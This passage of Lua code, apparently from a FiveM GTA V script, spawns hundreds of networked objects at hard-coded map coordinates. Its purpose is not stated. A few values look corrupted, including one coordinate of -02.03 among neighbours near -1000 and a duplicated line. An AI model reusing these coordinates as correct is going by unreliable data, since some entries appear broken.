        CreateObject(841438406, 936.10784912109, 65.433235168457, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -175.96006774902, 851.95654296875, 232.2336730957, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -378.96408081055, -665.22149658203, 37.331523895264, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -400.55596923828, -684.08380126953, 38.648769378662, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -424.40484619141, -683.000976562, 41.7034034729, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -454.91082763672, -659.82568359375, 32.939640045166, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -526.60095214844, -655.23120117188, 33.032760620117, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -548.05670166016, -652.36499023438, 33.029022216797, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -549.81390380859, -697.82177734375, 33.038799285889, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -545.24224853516, -727.92510986328, 32.671539306641, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -520.80108642578, -754.56994628906, 31.823480606079, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -512.77209472656, -787.97338867188, 30.698291778564, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -511.87390136719, -818.08868408203, 30.118923187256, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -529.15905761719, -836.0380859375, 30.150640487671, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -551.88409423828, -832.03967285156, 28.91349029541, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -585.46600341797, -826.14312744141, 27.006490707397, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -610.14520263672, -821.81286621094, 25.464250564575, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -628.9306640625, -803.87738037109, 24.981843948364, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -637.81195068359, -785.80139160156, 25.130237579346, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -633.58489990234, -758.08648681641, 26.000982284546, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -629.87268066406, -734.35369873047, 27.382390975952, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -634.79791259766, -715.943359375, 28.945636749268, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -640.24420166016, -696.60284423828, 30.309741973877, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -634.990234375, -678.34259033203, 31.290117263794, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -628.08715820312, -654.33892822266, 31.468461990356, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -622.80981445312, -636.04864501953, 31.568452835083, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -624.82916259766, -617.20471191406, 32.589164733887, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -628.06488037109, -587.33911132812, 34.198680877686, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -631.78466796875, -571.66296386719, 34.756660461426, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -643.56799316406, -549.61889648438, 34.542552947998, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -640.8134765625, -537.90405273438, 34.997482299805, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -635.07604980469, -513.45190429688, 35.664726257324, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -628.10278320312, -421.34710693359, 34.564311981201, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -629.86151123047, -401.3056640625, 34.559482574463, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -631.65686035156, -380.25494384766, 34.561431884766, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -619.43371582031, -365.70248413086, 36.288410186768, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -613.52569580078, -337.9553527832, 36.612091064453, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -601.14410400391, -329.03750610352, 35.440940856934, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -623.30218505859, -322.57138061523, 36.568145751953, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -651.68695068359, -315.99667358398, 35.298564910889, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -660.08483886719, -294.44018554688, 35.33576965332, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -669.49005126953, -270.23934936523, 35.905090332031, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -675.63958740234, -254.40756225586, 36.236812591553, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -685.41461181641, -235.52954101562, 36.507305145264, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -699.59857177734, -220.75393676758, 36.83130645752, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -720.09216308594, -231.41983032227, 36.841335296631, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -744.83020019531, -244.68208312988, 36.840751647949, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -763.2548828125, -249.6580657959, 37.007606506348, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -788.52966308594, -256.30065917969, 37.245109558105, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -802.20819091797, -253.92761230469, 36.788028717041, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -808.58575439453, -242.59887695312, 37.036464691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -820.70690917969, -214.9810333252, 37.704189300537, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -830.81787109375, -191.96983337402, 37.444049835205, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -844.55413818359, -175.86039733887, 37.463500976562, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -858.94464111328, -159.00291442871, 37.669784545898, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -876.65307617188, -170.47099304199, 38.014739990234, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -901.49310302734, -183.6675567627, 37.530975341797, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -921.02185058594, -194.07048034668, 37.495845794678, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -944.10266113281, -195.88412475586, 37.495014190674, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -968.55554199219, -200.96894836426, 37.222003936768, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -988.82012939453, -220.45167541504, 37.907089233398, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1024.4562988281, -241.43873596191, 37.525581359863, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1085.2475585938, -274.20718383789, 37.617164611816, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1103.4658203125, -269.15484619141, 37.867721557617, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1126.8005371094, -281.48663330078, 38.657535552979, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1148.359375, -292.28182983398, 38.791648864746, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1170.48828125, -291.85784912109, 38.992107391357, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1193.6276855469, -291.40768432617, 38.889110565186, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1218.7214355469, -290.92233276367, 37.657947540283, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1233.4307861328, -303.12777709961, 37.736988067627, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1248.2092285156, -315.27133178711, 37.84058380127, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1267.5900878906, -331.3115234375, 36.98416519165, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1283.8361816406, -344.75610351562, 36.470161437988, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1305.3353271484, -356.01519775391, 36.613246917725, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1334.1020507812, -360.79891967773, 36.65678024292, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1350.9398193359, -363.59573364258, 36.494960784912, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1367.2520751953, -379.93838500977, 36.652248382568, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1380.2022705078, -394.00366210938, 36.445823669434, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1402.9261474609, -398.17565917969, 36.796722412109, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1423.9675292969, -410.1028137207, 36.635139465332, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1441.4888916016, -420.03536987305, 36.128063201904, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1453.7445068359, -426.98056030273, 35.317489624023, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1475.6639404297, -439.37313842773, 35.271514892578, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1489.6983642578, -447.29193115234, 35.367473602295, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1501.1840820312, -453.77963256836, 35.336555480957, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1519.5579833984, -464.14825439453, 35.0448608398, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1533.578125, -472.01034545898, 35.126083374023, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1548.4698486328, -480.34732055664, 35.123199462891, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1560.7679443359, -487.18835449219, 35.087757110596, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1563.197265625, -499.99365234375, 35.675567626953, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1581.5412597656, -515.58569335938, 35.297256469727, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1605.193359375, -520.12579345703, 34.724109649658, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1688.1834716797, -528.16271972656, 40.576705932617, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1721.0336914062, -510.43545532227, 40.12907409668, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1741.0587158203, -501.48364257812, 38.634918212891, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1756.7415771484, -481.97271728516, 40.477088928223, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1769.8996582031, -465.51202392578, 41.534847259521, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1782.4383544922, -449.83868408203, 41.548976898193, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1804.0675048828, -439.05447387695, 42.195014953613, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1819.3243408203, -431.49542236328, 42.949752807617, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1831.8289794922, -425.26312255859, 43.874549865723, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1853.2891845703, -414.64498901367, 45.302425384521, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1868.5047607422, -407.18606567383, 46.350208282471, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1885.1983642578, -384.8176574707, 48.292461395264, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1890.3519287109, -366.56503295898, 48.854564666748, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1884.8326416016, -352.58810424805, 49.027431488037, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1876.5070800781, -331.61865234375, 47.802089691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1846.9636230469, -276.33001708984, 46.736312866211, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1819.0274658203, -325.36376953125, 45.809062957764, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1815.0964355469, -339.87322998047, 45.582927703857, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1808.5787353516, -364.11291503906, 44.005798339844, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1802.4747314453, -385.29006958008, 42.198215484619, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1790.9311523438, -428.03890991211, 38.48904800415, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1788.2253417969, -444.82955932617, 36.995174407959, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1784.5886230469, -467.58825683594, 34.884159088135, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1779.6987304688, -498.20559692383, 32.018699645996, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1774.1787109375, -532.76300048828, 28.706546783447, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1769.2905273438, -563.36108398438, 25.689037322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1766.2933349609, -582.12066650391, 23.8088016501, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1768.0249023438, -628.46899414062, 10.519196510315, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1759.4582519531, -646.53729248047, 10.309303283691, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1751.3765869141, -663.78558349609, 10.14768409729, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1740.7327880859, -686.55798339844, 10.167251586914, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1713.8133544922, -719.93347167969, 10.937111854553, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1696.1872558594, -733.31097412109, 11.090492248535, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1676.1856689453, -748.51867675781, 9.9981365203857, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1665.0916748047, -758.46258544922, 12.244045257568, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1647.5239257812, -776.37884521484, 13.427575111389, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1651.6759033203, -799.07305908203, 12.3508644104, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1656.9287109375, -823.55224609375, 10.77232170105, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1662.8148193359, -850.9658203125, 8.9593496322632, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1666.8171386719, -869.54602050781, 8.6330251693726, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1671.4582519531, -891.08728027344, 8.290337562561, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1676.3131103516, -913.60424804688, 7.8747358322144, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1679.9108886719, -930.2587890625, 7.4615921974182, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1684.5755615234, -951.86242675781, 7.5586032867432, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1689.5715332031, -975.40484619141, 6.8873271942139, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1693.1550292969, -992.03637695312, 6.3932785987854, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1657.939453125, -1028.4793701172, 12.766311645508, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1674.8597412109, -1044.0367431641, 12.859534263611, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1688.9105224609, -1056.8914794922, 12.827094078064, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1706.6948242188, -1073.1491699219, 12.829881668091, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1842.8005371094, -1232.2490234375, 12.765271186829, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1859.7833251953, -1221.6228027344, 13.040806770325, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1879.8327636719, -1201.8630371094, 13.140325546265, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1818.8970947266, -1244.9155273438, 16.184650421143, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1667.5478515625, -1112.1121826172, 15.34307384491, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1488.2962646484, -956.50500488281, 8.6661567687988, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1481.39453125, -965.09893798828, 9.0651473999023, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1442.4974365234, -02.0303344727, 8.0529880523682, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1426.8947753906, -1020.1224975586, 4.8073205947876, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1409.9012451172, -1039.7980957031, 4.3698844909668, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1390.2004394531, -1062.5466308594, 3.8684072494507, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1375.0466308594, -1080.0139160156, 3.980809211731, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1366.4007568359, -1114.6849365234, 8.4048643112183, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1364.3050537109, -1128.5925292969, 8.2246036529541, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1360.8507080078, -1151.4663085938, 7.1339063644409, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1358.1575927734, -1169.2646484375, 5.4720897674561, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1357.9407958984, -1197.0061035156, 4.2607550621033, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1361.3116455078, -1217.8570556641, 4.3437147140503, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1355.15234375, -1240.2905273438, 4.6479821205139, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1345.3043212891, -1262.2491455078, 6.5375714302063, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1335.3063964844, -1284.5822753906, 7.0228791236877, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1330.1655273438, -1297.8234863281, 6.3680057525635, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1324.9270019531, -1331.2257080078, 5.0359969139099, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1317.7286376953, -1348.9234619141, 5.4501256942749, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1308.4112548828, -1374.6842041016, 4.6584057807922, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1301.1278076172, -1396.6988525391, 4.1395206451416, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1294.0227050781, -1418.3414306641, 4.158908367157, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1276.6690673828, -1437.6485595703, 4.460620880127, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1262.9663085938, -1456.3391113281, 4.6627221107483, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1250.4888916016, -1473.3486328125, 4.041736125946, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1240.3615722656, -1487.1064453125, 4.0352692604065, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1218.2188720703, -1517.1315917969, 4.1369280815125, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1212.6579589844, -1549.1138916016, 4.4212770462036, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1202.3359375, -1566.4606933594, 4.8673343658447, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -1039.8928222656, -1397.20830078, 5.301194190979, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -205.97943115234, -1307.7111816406, 32.463283538818, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -208.08169555664, -1322.1918945312, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -210.46829223633, -1332.6993408203, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 87.46117401123, -1925.2875976562, 22.540056228638, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 101.1555557251, -1933.6849365234, 23.343391418457, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 114.682762146, -1942.3416748047, 22.059331893921, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 91.787879943848, -1947.1599121094, 22.13903427124, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -96.82292175293, -1583.6147460938, 31.914810180664, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -165.88885498047, -1669.705078125, 32.914325714111, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -131.21087646484, -1583.7025146484, 33.982086181641, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -564.41174316406, 272.36557006836, 84.375846862793, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 376.63070678711, 322.68417358398, 103.56887054443, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 435.130305859, 216.90020751953, 102.91343688965, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 462.97250366211, 242.70608520508, 105.35186767578, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 463.30364990234, 252.55215454102, 107.32363891602, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 437.65286254883, 266.67935180664, 103.01537322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 429.43933105469, 250.82200622559, 105.63001251221, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 961.47344970703, -137.86401367188, 74.19605255127, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 980.24877929688, -127.23160552979, 73.605422973633, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 968.25885009766, -118.1788482666, 74.214859008789, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 988.52282714844, -112.56884002686, 74.228507995605, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 988.68646240234, -101.54683685303, 74.598121643066, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 980.42834472656, -105.61399841309, 74.69669342041, true, true, true)
        Citizen.Wait(0)
        CreateObject(2967811882, 289.80303955078, 176.33485412598, 104.16362762451, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 342.82180786133, 109.17627716064, 102.25390625, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 311.09707641602, -0.66867196559906, 80.478523254395, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 258.19369506836, -148.08422851562, 63.999645233154, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 190.13160705566, -307.9919128418, 44.129356384277, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 152.85752868652, -413.20791625977, 41.093223571777, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 110.89814758301, -559.67547607422, 31.626415252686, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 44.002738952637, -739.80334472656, 31.767831802368, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -36.021713256836, -931.66741943359, 29.320764541626, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -94.51407623291, -1157.5056152344, 25.760782241821, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -96.965911865234, -1342.0460205078, 29.339040756226, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -133.09577941895, -1528.0103759766, 34.214588165283, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -135.51835632324, -1735.9741210938, 30.103620529175, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 93.584823608398, -1915.9150390625, 20.741292953491, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 154.10935974121, -1792.9288330078, 28.996482849121, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 238.47276306152, -1713.8931884766, 29.075937271118, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 207.06182861328, -1607.7380371094, 29.330911636353, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 232.4162902832, -1420.3079833984, 29.242002487183, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 222.65469360352, -1297.1281738281, 29.314462661743, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 219.94142150879, -1047.5908203125, 29.360450744629, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 305.37609863281, -800.81658935547, 29.339599609375, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 415.33599853516, -523.46160888672, 9.137152671814, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 601.40679931641, 37.490180969238, 90.777885437012, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 648.3603515625, 217.51800537109, 97.319801330566, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 667.48309326172, 325.80426025391, 116.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 823.17126464844, 203.20741271973, 81.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 872.45971679688, 139.58018493652, 72.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 785.41644287109, 26.121658325195, 62.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 683.43371582031, -143.50646972656, 46.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 605.70526123047, -289.50973510742, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 516.56384277344, -379.41500854492, 36.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 439.98226928711, -454.90103149414, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 312.71276855469, -485.09936523438, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 189.06901550293, -607.71380615234, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 80.306671142578, -616.57965087891, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 55.985382080078, -686.974609375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 32.928806304932, -736.70056152344, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -4.1130304336548, -763.57354736328, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -37.031120300293, -755.37908935547, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -77.169891357422, -743.74078369141, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -105.80905151367, -722.05706787109, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -142.09321594238, -699.48010253906, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -179.060463867, -676.13171386719, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -219.05352783203, -668.16857910156, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -244.68600463867, -654.99914550781, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -242.65994262695, -615.35284423828, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -226.61053466797, -576.61193847656, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -204.27388000488, -525.74761962891, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -194.17991638184, -488.07662963867, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -191.74856567383, -441.53875732422, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -163.73318481445, -407.77178955078, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -150.57876586914, -363.31097412109, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -117.31154632568, -300.70907592773, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -112.46209716797, -270.09036254883, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -105.26519012451, -231.9108581543, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -96.305992126465, -208.57139587402, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -82.840637207031, -169.92846679688, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -78.284744262695, -145.34693908691, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -61.337020874023, -53.904315948486, 63.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -3.1353807449341, 119.09279632568, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 29.801212310791, 212.17195129395, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 50.15075302124, 240.48179626465, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 132.52355957031, 209.7177734375, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 267.68319702148, 177.27178955078, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 399.44277954102, 256.72280883789, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 262.4895324707, 433.08334350586, 121.43519592285, true, true, true)
            Citizen.Wait(0)
